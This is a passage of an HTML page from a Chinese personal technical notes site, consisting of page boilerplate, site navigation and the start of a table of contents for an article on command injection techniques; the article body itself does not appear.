<!doctype html><html lang=zh class=no-js> <head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><link href=http://vjob.top/other/%E5%B7%A7%E7%94%A8%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%9A%84N%E7%A7%8D%E6%96%B9%E5%BC%8F/ rel=canonical><link rel=icon href=../../assets/images/favicon.png><meta name=generator content="mkdocs-1.2.3, mkdocs-material-8.2.1"><title>巧用命令注入的N种方式 - 微站</title><link rel=stylesheet href=../../assets/stylesheets/main.e8d9bf0c.min.css><link rel=stylesheet href=../../assets/stylesheets/palette.e6a45f82.min.css><meta name=theme-color content=#ffffff><link rel=preconnect href=https://fonts.gstatic.com crossorigin><link rel=stylesheet href="https://fonts.googleapis.com/css?family=Noto+Sans:300,400,400i,700%7CSource+Code+Pro&display=fallback"><style>:root{--md-text-font:"Noto Sans";--md-code-font:"Source Code Pro"}</style><script>__md_scope=new URL("../..",location),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script></head> <body dir=ltr data-md-color-scheme=preference data-md-color-primary=white data-md-color-accent=red> <input class=md-toggle data-md-toggle=drawer type=checkbox id=__drawer autocomplete=off> <input class=md-toggle data-md-toggle=search type=checkbox id=__search autocomplete=off> <label class=md-overlay for=__drawer></label> <div data-md-component=skip> <a href=#n class=md-skip> 跳转至 </a> </div> <div data-md-component=announce> </div> <header class="md-header md-header--lifted" data-md-component=header> <nav class="md-header__inner md-grid" aria-label=页眉> <a href=../.. title=微站 class="md-header__button md-logo" aria-label=微站 data-md-component=logo> <img src=../../img/avatar.png alt=logo> </a> <label class="md-header__button md-icon" for=__drawer> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2z"/></svg> </label> <div class=md-header__title data-md-component=header-title> <div class=md-header__ellipsis> <div class=md-header__topic> <span class=md-ellipsis> 微站 </span> </div> <div class=md-header__topic data-md-component=header-topic> <span class=md-ellipsis> 巧用命令注入的N种方式 </span> </div> </div> </div> <label class="md-header__button md-icon" for=__search> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg> </label> <div class=md-search data-md-component=search role=dialog> <label class=md-search__overlay for=__search></label> <div class=md-search__inner role=search> <form class=md-search__form name=search> <input type=text class=md-search__input name=query aria-label=搜索 placeholder=搜索 autocapitalize=off autocorrect=off autocomplete=off spellcheck=false data-md-component=search-query required> <label class="md-search__icon md-icon" for=__search> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg> </label> <nav class=md-search__options aria-label=查找> <a href=javascript:void(0) class="md-search__icon md-icon" aria-label=分享 data-clipboard data-clipboard-text data-md-component=search-share tabindex=-1> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7 0-.24-.04-.47-.09-.7l7.05-4.11c.54.5 1.25.81 2.04.81a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3c0 .24.04.47.09.7L8.04 9.81C7.5 9.31 6.79 9 6 9a3 3 0 0 0-3 3 3 3 0 0 0 3 3c.79 0 1.5-.31 2.04-.81l7.12 4.15c-.05.21-.08.43-.08.66 0 1.61 1.31 2.91 2.92 2.91 1.61 0 2.92-1.3 2.92-2.91A2.92 2.92 0 0 0 18 16.08z"/></svg> </a> <button type=reset class="md-search__icon md-icon" aria-label=清空当前内容 tabindex=-1> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41z"/></svg> </button> </nav> <div class=md-search__suggest data-md-component=search-suggest></div> </form> <div class=md-search__output> <div class=md-search__scrollwrap data-md-scrollfix> <div class=md-search-result data-md-component=search-result> <div class=md-search-result__meta> 正在初始化搜索引擎 </div> <ol class=md-search-result__list></ol> </div> </div> </div> </div> </div> </nav> <nav class=md-tabs aria-label=标签 data-md-component=tabs> <div class="md-tabs__inner md-grid"> <ul class=md-tabs__list> <li class=md-tabs__item> <a href=../.. class=md-tabs__link> 主页 </a> </li> <li class=md-tabs__item> <a href=../../RPI/%E6%A0%91%E8%8E%93%E6%B4%BE%E5%AE%89%E8%A3%85Ubuntu%20mate15.10-%E7%B3%BB%E7%BB%9F%E7%AC%94%E8%AE%B0_machh%E7%9A%84%E4%B8%93%E6%A0%8F-CSDN%E5%8D%9A%E5%AE%A2/ class=md-tabs__link> 树莓派 </a> </li> <li class=md-tabs__item> <a href=../../Android/Android10%E6%BA%90%E7%A0%81%E4%B8%8B%E8%BD%BD/ class=md-tabs__link> Android </a> </li> <li class=md-tabs__item> <a href=../../Bash/%E5%BA%94%E8%AF%A5%E7%9F%A5%E9%81%93%E7%9A%84Linux%E6%8A%80%E5%B7%A7/ class=md-tabs__link> Bash </a> </li> <li class=md-tabs__item> <a href=../CTF%E5%B8%B8%E7%94%A8%E8%A7%A3%E5%AF%86%E8%84%9A%E6%9C%AC/ class="md-tabs__link md-tabs__link--active"> 安全 </a> </li> <li class=md-tabs__item> <a href=../How%20to%20Get%20Rich/ class=md-tabs__link> 其它 </a> </li> </ul> </div> </nav> </header> <div class=md-container data-md-component=container> <main class=md-main data-md-component=main> <div class="md-main__inner md-grid"> <div class="md-sidebar md-sidebar--primary" data-md-component=sidebar data-md-type=navigation> <div class=md-sidebar__scrollwrap> <div class=md-sidebar__inner> <nav class="md-nav md-nav--primary md-nav--lifted" aria-label=导航栏 data-md-level=0> <label class=md-nav__title for=__drawer> <a href=../.. title=微站 class="md-nav__button md-logo" aria-label=微站 data-md-component=logo> <img src=../../img/avatar.png alt=logo> </a> 微站 </label> <ul class=md-nav__list data-md-scrollfix> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_1 type=checkbox id=__nav_1> <label class=md-nav__link for=__nav_1> 主页 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=主页 data-md-level=1> <label class=md-nav__title for=__nav_1> <span class="md-nav__icon md-icon"></span> 主页 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../.. class=md-nav__link> 微站 </a> </li> <li class=md-nav__item> <a href=../../RPI/%E7%A1%AC%E7%9B%98%E5%90%AF%E5%8A%A8%E6%A0%91%E8%8E%93%E6%B4%BE%EF%BC%93B/ class=md-nav__link> 树莓派 </a> </li> <li class=md-nav__item> <a href=../../Android/Android10%E6%BA%90%E7%A0%81%E4%B8%8B%E8%BD%BD/ class=md-nav__link> Android </a> </li> <li class=md-nav__item> <a href=../../Bash/%E5%BA%94%E8%AF%A5%E7%9F%A5%E9%81%93%E7%9A%84Linux%E6%8A%80%E5%B7%A7/ class=md-nav__link> Bash </a> </li> <li class=md-nav__item> <a href=../../Android/Mobile%20Application%20Penetration%20Testing%20Cheat%20sheet%20with%20Tools%20%26%20Resources/ class=md-nav__link> 安全 </a> </li> <li class=md-nav__item> <a href=../How%20to%20Get%20Rich/ class=md-nav__link> 其它 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2 type=checkbox id=__nav_2> <label class=md-nav__link for=__nav_2> 树莓派 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=树莓派 data-md-level=1> <label class=md-nav__title for=__nav_2> <span class="md-nav__icon md-icon"></span> 树莓派 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../RPI/%E6%A0%91%E8%8E%93%E6%B4%BE%E5%AE%89%E8%A3%85Ubuntu%20mate15.10-%E7%B3%BB%E7%BB%9F%E7%AC%94%E8%AE%B0_machh%E7%9A%84%E4%B8%93%E6%A0%8F-CSDN%E5%8D%9A%E5%AE%A2/ class=md-nav__link> 树莓派安装Ubuntu mate15.10 系统笔记 machh的专栏 CSDN博客 </a> </li> <li class=md-nav__item> <a href=../../RPI/%E7%A1%AC%E7%9B%98%E5%90%AF%E5%8A%A8%E6%A0%91%E8%8E%93%E6%B4%BE%EF%BC%93B/ class=md-nav__link> 硬盘启动树莓派３B </a> </li> <li class=md-nav__item> <a href=../../RPI/%E6%A0%91%E8%8E%93%E6%B4%BE%E5%AE%89%E8%A3%85JDK/ class=md-nav__link> 树莓派安装JDK </a> </li> <li class=md-nav__item> <a href=../../RPI/%E5%B0%86%E6%A0%91%E8%8E%93%E6%B4%BERaspberry%20Pi%E8%AE%BE%E7%BD%AE%E4%B8%BA%E6%97%A0%E7%BA%BF%E8%B7%AF%E7%94%B1%E5%99%A8%28WiFi%E7%83%AD%E7%82%B9AP%2CRTL8188CUS%E8%8A%AF%E7%89%87%29/ class=md-nav__link> 将树莓派Raspberry Pi设置为无线路由器(WiFi热点AP,RTL8188CUS芯片) </a> </li> <li class=md-nav__item> <a href=../../RPI/Using%20Raspberry%20Pi%20for%20Laravel%20developing/ class=md-nav__link> Using Raspberry Pi for Laravel developing </a> </li> <li class=md-nav__item> <a href=../../RPI/VNC%20setup%20on%20Raspberry%20Pi%20from%20Ubuntu/ class=md-nav__link> VNC setup on Raspberry Pi from Ubuntu </a> </li> <li class=md-nav__item> <a href=../../RPI/%E8%AE%BE%E7%BD%AE%E6%A0%91%E8%8E%93%E6%B4%BE%E4%BD%BF%E7%94%A8%E5%A4%96%E7%BD%AE%E7%A1%AC%E7%9B%98%E5%90%AF%E5%8A%A8/ class=md-nav__link> 设置树莓派使用外置硬盘启动 </a> </li> <li class=md-nav__item> <a href=../../RPI/%E6%8A%8A%E6%A0%91%E8%8E%93%E6%B4%BE%E5%8F%98%E6%88%9024%E5%B0%8F%E6%97%B6%E8%BF%90%E8%A1%8C%E7%9A%84%E4%B8%8B%E8%BD%BD%E7%A5%9E%E5%99%A8%EF%BC%88%E7%A7%8D%E5%AD%90%E3%80%81%E7%A3%81%E5%8A%9B%E9%93%BE%E9%80%9A%E9%80%9A%E6%94%AF%E6%8C%81%EF%BC%89/ class=md-nav__link> 把树莓派变成24小时运行的下载神器（种子、磁力链通通支持） </a> </li> <li class=md-nav__item> <a href=../../RPI/%E5%9C%A8%E6%A0%91%E8%8E%93%E6%B4%BE2%E4%B8%8A%E5%AE%89%E8%A3%85%20Chromium%20%E6%B5%8F%E8%A7%88%E5%99%A8%E5%8F%8A%20Google%20%E6%8B%BC%E9%9F%B3%E8%BE%93%E5%85%A5%E6%B3%95/ class=md-nav__link> 在树莓派2上安装 Chromium 浏览器及 Google 拼音输入法 </a> </li> <li class=md-nav__item> <a href=../../RPI/%E4%B8%BA%E6%A0%91%E8%8E%93%E6%B4%BEDIY%E4%B8%80%E6%AC%BE%E9%AB%98%E9%80%9F%E7%A8%B3%E5%AE%9A%E7%9A%84%E6%97%A0%E7%BA%BF%E7%BD%91%E5%8D%A1/ class=md-nav__link> 为树莓派DIY一款高速稳定的无线网卡 </a> </li> <li class=md-nav__item> <a href=../../RPI/%E6%A0%91%E8%8E%93%E6%B4%BE%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B6%E2%80%94%E2%80%94%E6%A0%91%E8%8E%93%E6%B4%BE%E5%81%9Awifi%E7%83%AD%E7%82%B9_%E8%80%81%E5%BE%902014-CSDN%E5%8D%9A%E5%AE%A2_%E6%A0%91%E8%8E%93%E6%B4%BE%E5%81%9Awifi%E7%83%AD%E7%82%B9/ class=md-nav__link> 树莓派开发系列教程6——树莓派做wifi热点 老徐2014 CSDN博客 树莓派做wifi热点 </a> </li> <li class=md-nav__item> <a href=../../RPI/%E6%A0%91%E8%8E%93%E6%B4%BEwifi%E7%A0%B4%E8%A7%A3%E6%95%B4%E7%90%86%20-%20FindHao/ class=md-nav__link> 树莓派wifi破解整理 FindHao </a> </li> <li class=md-nav__item> <a href=../../RPI/%E6%A0%91%E8%8E%93%E6%B4%BE%E9%A6%99%E6%A9%99%E6%B4%BE%E6%97%A0%E7%BA%BF%E6%92%AD%E6%94%BE%EF%BC%8C%E5%AE%9E%E7%8E%B0DLNA%E4%B8%8EAirPlay%E5%8D%8F%E8%AE%AE%E6%97%A0%E7%BA%BF%E9%9F%B3%E7%AE%B1/ class=md-nav__link> 树莓派香橙派无线播放，实现DLNA与AirPlay协议无线音箱 </a> </li> <li class=md-nav__item> <a href=../../RPI/SSH%E9%80%9A%E8%BF%87%E4%BB%A3%E7%90%86%E8%BF%9E%E6%8E%A5/ class=md-nav__link> SSH通过代理连接 </a> </li> <li class=md-nav__item> <a href=../../RPI/Autossh%20and%20Systemd%20Service/ class=md-nav__link> Autossh and Systemd Service </a> </li> <li class=md-nav__item> <a href=../../RPI/Copying%20MySQL%20Databases%20to%20Another%20Machine/ class=md-nav__link> Copying MySQL Databases to Another Machine </a> </li> <li class=md-nav__item> <a href=../../RPI/How%20To%20Move%20a%20MySQL%20Data%20Directory%20to%20a%20New%20Location%20on%20Ubuntu%2016.04/ class=md-nav__link> How To Move a MySQL Data Directory to a New Location on Ubuntu 16.04 </a> </li> <li class=md-nav__item> <a href=../../RPI/Latest%20Version%20of%20Firefox%20and%20Thunderbird%20on%20a%20Raspberry%20Pi%20%5Bobsolete%5D/ class=md-nav__link> Latest Version of Firefox and Thunderbird on a Raspberry Pi [obsolete] </a> </li> <li class=md-nav__item> <a href=../../RPI/OpenWrt%20%E4%BD%BF%E7%94%A8%20frp%20%E5%AE%9E%E7%8E%B0%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F%20%E5%87%86%E5%A4%87%E5%B7%A5%E4%BD%9C%20%E6%90%AD%E5%BB%BA%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F%20%E6%96%87%E7%AB%A0%E8%AF%84%E8%AE%BA/ class=md-nav__link> OpenWrt 使用 frp 实现内网穿透 准备工作 搭建内网穿透 文章评论 </a> </li> <li class=md-nav__item> <a href=../../RPI/%E8%A7%A3%E5%86%B3%E6%A0%91%E8%8E%93%E6%B4%BESSH%E7%99%BB%E5%BD%95%E7%BC%93%E6%85%A2%E7%9A%84%E9%97%AE%E9%A2%98_Maoning%20Guan%E7%9A%84%E5%8D%9A%E5%AE%A2-CSDN%E5%8D%9A%E5%AE%A2/ class=md-nav__link> 解决树莓派SSH登录缓慢的问题 Maoning Guan的博客 CSDN博客 </a> </li> <li class=md-nav__item> <a href=../../RPI/Reading%20privileged%20memory%20with%20a%20side-channel/ class=md-nav__link> Reading privileged memory with a side channel </a> </li> <li class=md-nav__item> <a href=../../RPI/Install%20Latest%20ReadyMedia%20miniDLNA%20Raspberry%20Pi/ class=md-nav__link> Install Latest ReadyMedia miniDLNA Raspberry Pi </a> </li> <li class=md-nav__item> <a href=../../RPI/%E4%BD%BF%E7%94%A8%20vcgencmd%20%E6%8C%87%E4%BB%A4%E6%9F%A5%E7%9C%8B%20Raspberry%20Pi%20%E7%9A%84%20CPU%20%E6%BA%AB%E5%BA%A6%E3%80%81%E9%81%8B%E8%A1%8C%E9%80%9F%E5%BA%A6%E8%88%87%E9%9B%BB%E5%A3%93%E7%AD%89%E8%B3%87%E8%A8%8A/ class=md-nav__link> 使用 vcgencmd 指令查看 Raspberry Pi 的 CPU 溫度、運行速度與電壓等資訊 </a> </li> <li class=md-nav__item> <a href=../../RPI/Aria2%20%E7%BC%96%E8%AF%91%20%E6%B7%BB%E5%8A%A0%E6%94%AF%E6%8C%81BT%E4%B8%8B%E8%BD%BD%E7%9A%84%E5%8A%9F%E8%83%BD%EF%BC%88X86%E5%92%8Carmhf%E7%9A%84%E6%A0%91%E8%8E%93%E6%B4%BE2%EF%BC%89/ class=md-nav__link> Aria2 编译 添加支持BT下载的功能（X86和armhf的树莓派2） </a> </li> <li class=md-nav__item> <a href=../../RPI/Let%27s%20Encrypt%EF%BC%8C%E5%85%8D%E8%B4%B9%E5%A5%BD%E7%94%A8%E7%9A%84%20HTTPS%20%E8%AF%81%E4%B9%A6/ class=md-nav__link> Let's Encrypt，免费好用的 HTTPS 证书 </a> </li> <li class=md-nav__item> <a href=../../RPI/%E4%BD%BF%E7%94%A8SSH%E5%8F%8D%E5%90%91%E9%9A%A7%E9%81%93%E8%BF%9B%E8%A1%8C%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/ class=md-nav__link> 使用SSH反向隧道进行内网穿透 </a> </li> <li class=md-nav__item> <a href=../../RPI/%E6%A0%91%E8%8E%93%E6%B4%BE%E5%88%A9%E7%94%A8nginx%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%EF%BC%8C%E6%88%90%E4%B8%BAIPv6_IPv4%E5%85%AC%E7%BD%91%E6%9C%8D%E5%8A%A1%E5%99%A8%EF%BC%88%E9%9C%80%E8%A6%81%E8%BF%9C%E7%A8%8B%E5%8F%8C%E6%A0%88%E6%9C%8D%E5%8A%A1%E5%99%A8%EF%BC%89/ class=md-nav__link> 树莓派利用nginx反向代理，成为IPv6 IPv4公网服务器（需要远程双栈服务器） </a> </li> <li class=md-nav__item> <a href=../../RPI/%E5%A6%82%E4%BD%95%E5%9C%A8%E6%A0%91%E8%8E%93%E6%B4%BE%E4%B8%8A%E6%90%AD%E5%BB%BA%20WordPress/ class=md-nav__link> 如何在树莓派上搭建 WordPress </a> </li> <li class=md-nav__item> <a href=../../RPI/Install%20Redis%20on%20your%20Raspberry%20Pi/ class=md-nav__link> Install Redis on your Raspberry Pi </a> </li> <li class=md-nav__item> <a href=../../RPI/%E6%A0%91%E8%8E%93%E6%B4%BE4%E5%8F%98%E8%BA%AB%E6%97%81%E8%B7%AF%E7%94%B1/ class=md-nav__link> 树莓派4变身旁路由 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_3 type=checkbox id=__nav_3> <label class=md-nav__link for=__nav_3> Android <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Android data-md-level=1> <label class=md-nav__title for=__nav_3> <span class="md-nav__icon md-icon"></span> Android </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../Android/Android10%E6%BA%90%E7%A0%81%E4%B8%8B%E8%BD%BD/ class=md-nav__link> Android10源码下载 </a> </li> <li class=md-nav__item> <a href=../../Android/%E5%B1%8F%E5%B9%95%E5%9D%8F%E4%B8%80%E5%8A%A0%E6%89%8B%E6%9C%BA%E5%88%B7android10/ class=md-nav__link> 屏幕坏一加手机刷android10 </a> </li> <li class=md-nav__item> <a href=../../Android/Enable%20ADB%20from%20recovery/ class=md-nav__link> Enable ADB from recovery </a> </li> <li class=md-nav__item> <a href=../../Android/Android%E7%B3%BB%E7%BB%9F%E6%9D%83%E9%99%90%E5%92%8Croot%E6%9D%83%E9%99%90/ class=md-nav__link> Android系统权限和root权限 </a> </li> <li class=md-nav__item> <a href=../../Android/%E3%80%90Android%20ROM%E5%AE%9A%E5%88%B6%E3%80%91CyanogenMod%E6%BA%90%E7%A0%81%E4%B8%8B%E8%BD%BD%E5%92%8C%E7%BC%96%E8%AF%91/ class=md-nav__link> 【Android ROM定制】CyanogenMod源码下载和编译 </a> </li> <li class=md-nav__item> <a href=../../Android/android%E5%86%85%E5%AD%98%E6%B3%84%E9%9C%B2%E4%BC%98%E5%8C%96%E6%80%BB%E7%BB%93/ class=md-nav__link> Android内存泄露优化总结 </a> </li> <li class=md-nav__item> <a href=../../Android/%E6%97%A5%E7%A7%AF%E6%9C%88%E7%B4%AF%EF%BC%9AProguard%E8%BF%9B%E8%A1%8C%E6%BA%90%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86%E5%92%8C%E5%B4%A9%E6%BA%83%E6%97%A5%E5%BF%97%E5%8F%8D%E6%B7%B7%E6%B7%86/ class=md-nav__link> 日积月累：Proguard进行源代码混淆和崩溃日志反混淆 </a> </li> <li class=md-nav__item> <a href=../../Android/10%20Ways%20to%20Improve%20Your%20Android%20App%27s%20Performance/ class=md-nav__link> 10 Ways to Improve Your Android App's Performance </a> </li> <li class=md-nav__item> <a href=../../Android/Anatomy%20of%20RecyclerView%3Aa%20Search%20for%20a%20ViewHolder/ class=md-nav__link> Anatomy of RecyclerView:a Search for a ViewHolder </a> </li> <li class=md-nav__item> <a href=../../Android/Android%E6%8F%92%E4%BB%B6%E5%8C%96%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90%E2%80%94%E2%80%94Hook%E6%9C%BA%E5%88%B6%E4%B9%8BBinder%20Hook/ class=md-nav__link> Android插件化原理解析——Hook机制之Binder Hook </a> </li> <li class=md-nav__item> <a href=../../Android/%E6%89%8B%E6%8A%8A%E6%89%8B%E6%95%99%E4%BD%A0%E5%BD%93%E5%BE%AE%E4%BF%A1%E8%BF%90%E5%8A%A8%E7%AC%AC%E4%B8%80%E5%90%8D%E2%80%93%E5%88%A9%E7%94%A8AndroidHook%E8%BF%9B%E8%A1%8C%E5%BE%AE%E4%BF%A1%E8%BF%90%E5%8A%A8%E4%BD%9C%E5%BC%8A/ class=md-nav__link> 手把手教你当微信运动第一名–利用AndroidHook进行微信运动作弊 </a> </li> <li class=md-nav__item> <a href=../../Android/%E9%BB%91%E5%AE%A2%E5%8F%AF%E4%BB%A5%E5%88%A9%E7%94%A8%E4%B8%89%E6%98%9F%E9%A2%84%E8%A3%85%E7%9A%84%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%9D%A5%E7%9B%91%E8%A7%86%E7%94%A8%E6%88%B7/ class=md-nav__link> 黑客可以利用三星预装的应用程序来监视用户 </a> </li> <li class=md-nav__item> <a href=../../Android/Android%20%E5%8A%A8%E7%94%BB%E6%80%BB%E7%BB%93%20Android%20%E5%8A%A8%E7%94%BB%E6%80%BB%E7%BB%93/ class=md-nav__link> Android 动画总结 Android 动画总结 </a> </li> <li class=md-nav__item> <a href=../../Android/Android%E7%AD%BE%E5%90%8D%E6%80%BB%E7%BB%93/ class=md-nav__link> Android签名总结 </a> </li> <li class=md-nav__item> <a href=../../Android/Am%E5%91%BD%E4%BB%A4%E7%94%A8%E6%B3%95/ class=md-nav__link> Am命令用法 </a> </li> <li class=md-nav__item> <a href=../../Android/10%20Tips%20for%20using%20the%20Eclipse%20Memory%20Analyzer/ class=md-nav__link> 10 Tips for using the Eclipse Memory Analyzer </a> </li> <li class=md-nav__item> <a href=../../Android/android%E4%BD%BF%E7%94%A8ndk-stack%E8%B0%83%E8%AF%95JNI%E9%83%A8%E5%88%86%E7%9A%84C_C%2B%2B%E4%BB%A3%E7%A0%81/ class=md-nav__link> android使用ndk stack调试JNI部分的C C++代码 </a> </li> <li class=md-nav__item> <a href=../../Android/NativeActivity%E5%8E%9F%E7%90%86/ class=md-nav__link> NativeActivity原理 </a> </li> <li class=md-nav__item> <a href=../../Android/Using%20data%20binding%20in%20Android/ class=md-nav__link> Using data binding in Android </a> </li> <li class=md-nav__item> <a href=../../Android/Android%E4%B8%8AWebRTC%E4%BB%8B%E7%BB%8D/ class=md-nav__link> Android上WebRTC介绍 </a> </li> <li class=md-nav__item> <a href=../../Android/CoordinatorLayout%E9%AB%98%E7%BA%A7%E7%94%A8%E6%B3%95-%E8%87%AA%E5%AE%9A%E4%B9%89Behavior/ class=md-nav__link> CoordinatorLayout高级用法 自定义Behavior </a> </li> <li class=md-nav__item> <a href=../../Android/OpenSSL%E5%AE%9E%E8%B7%B5-Android%E4%B8%8B%E7%9A%84%E7%BC%96%E8%AF%91%E5%92%8C%E4%BD%BF%E7%94%A8/ class=md-nav__link> OpenSSL实践 Android下的编译和使用 </a> </li> <li class=md-nav__item> <a href=../../Android/%E4%BD%BF%E7%94%A8ShareSDK%E5%AE%8C%E6%88%90%E7%AC%AC%E4%B8%89%E6%96%B9%EF%BC%88QQ%E3%80%81%E5%BE%AE%E4%BF%A1%E3%80%81%E5%BE%AE%E5%8D%9A%EF%BC%89%E7%99%BB%E5%BD%95%E5%92%8C%E5%88%86%E4%BA%AB/ class=md-nav__link> 使用ShareSDK完成第三方（QQ、微信、微博）登录和分享 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_4 type=checkbox id=__nav_4> <label class=md-nav__link for=__nav_4> Bash <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Bash data-md-level=1> <label class=md-nav__title for=__nav_4> <span class="md-nav__icon md-icon"></span> Bash </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../Bash/%E5%BA%94%E8%AF%A5%E7%9F%A5%E9%81%93%E7%9A%84Linux%E6%8A%80%E5%B7%A7/ class=md-nav__link> 应该知道的Linux技巧 </a> </li> <li class=md-nav__item> <a href=../../Bash/%E4%BC%98%E9%9B%85%E5%9C%B0%E4%BD%BF%E7%94%A8%E5%91%BD%E4%BB%A4%E8%A1%8C%EF%BC%9ATmux%20%E7%BB%88%E7%AB%AF%E5%A4%8D%E7%94%A8/ class=md-nav__link> 优雅地使用命令行：Tmux 终端复用 </a> </li> <li class=md-nav__item> <a href=../../Bash/%E6%88%91%E7%9A%84ImageMagick%E4%BD%BF%E7%94%A8%E5%BF%83%E5%BE%97/ class=md-nav__link> 我的ImageMagick使用心得 </a> </li> <li class=md-nav__item> <a href=../../Bash/gdbcomm/ class=md-nav__link> Gdbcomm </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--active md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_5 type=checkbox id=__nav_5 checked> <label class=md-nav__link for=__nav_5> 安全 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=安全 data-md-level=1> <label class=md-nav__title for=__nav_5> <span class="md-nav__icon md-icon"></span> 安全 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../CTF%E5%B8%B8%E7%94%A8%E8%A7%A3%E5%AF%86%E8%84%9A%E6%9C%AC/ class=md-nav__link> CTF常用解密脚本 </a> </li> <li class=md-nav__item> <a href=../CTF%E5%B8%B8%E7%94%A8RSA%E6%8A%80%E5%B7%A7/ class=md-nav__link> CTF常用RSA技巧 </a> </li> <li class=md-nav__item> <a href=../RSA/ class=md-nav__link> RSA </a> </li> <li class=md-nav__item> <a href=../SageMath%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0/ class=md-nav__link> SageMath常用函数 </a> </li> <li class=md-nav__item> <a href=../../Android/Mobile%20Application%20Penetration%20Testing%20Cheat%20sheet%20with%20Tools%20%26%20Resources/ class=md-nav__link> Mobile Application Penetration Testing Cheat sheet with Tools & Resources </a> </li> <li class=md-nav__item> <a href=../Most%20Important%20Network%20Penetration%20Testing%20Tools%20for%20Hackers%20%26%20Security%20Professionals/ class=md-nav__link> Most Important Network Penetration Testing Tools for Hackers & Security Professionals </a> </li> <li class=md-nav__item> <a href=../%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB%E5%AE%9E%E9%AA%8C/ class=md-nav__link> 缓冲区溢出攻击实验 </a> </li> <li class="md-nav__item md-nav__item--active"> <input class="md-nav__toggle md-toggle" data-md-toggle=toc type=checkbox id=__toc> <label class="md-nav__link md-nav__link--active" for=__toc> 巧用命令注入的N种方式 <span class="md-nav__icon md-icon"></span> </label> <a href=./ class="md-nav__link md-nav__link--active"> 巧用命令注入的N种方式 </a> <nav class="md-nav md-nav--secondary" aria-label=目录> <label class=md-nav__title for=__toc> <span class="md-nav__icon md-icon"></span> 目录 </label> <ul class=md-nav__list data-md-component=toc data-md-scrollfix> <li class=md-nav__item> <a href=#n class=md-nav__link> 巧用命令注入的N种方式 </a> </li> <li class=md-nav__item> <a href=#_1 class=md-nav__link> 命令执行 </a> <nav class=md-nav aria-label=命令执行> <ul class=md-nav__list> <li class=md-nav__item> <a href=#_2 class=md-nav__link> 理论基础 </a> </li> <li class=md-nav__item> <a href=#_3 class=md-nav__link> 特殊符号 </a> <nav class=md-nav aria-label=特殊符号> <ul class=md-nav__list> <li class=md-nav__item> <a href=#_4 class=md-nav__link> | </a> </li> <li class=md-nav__item> <a href=#_5 class=md-nav__link> &amp; </a> </li> <li class=md-nav__item> <a href=#linux class=md-nav__link> Linux中的&amp;&amp;与|| </a> </li> <li class=md-nav__item> <a href=#_6 class=md-nav__link> &amp;&amp; </a> </li> <li class=md-nav__item> <a href=#_7 class=md-nav__link> || </a> </li> <li class=md-nav__item> <a href=#_8 class=md-nav__link> ;分号 </a> </li> <li 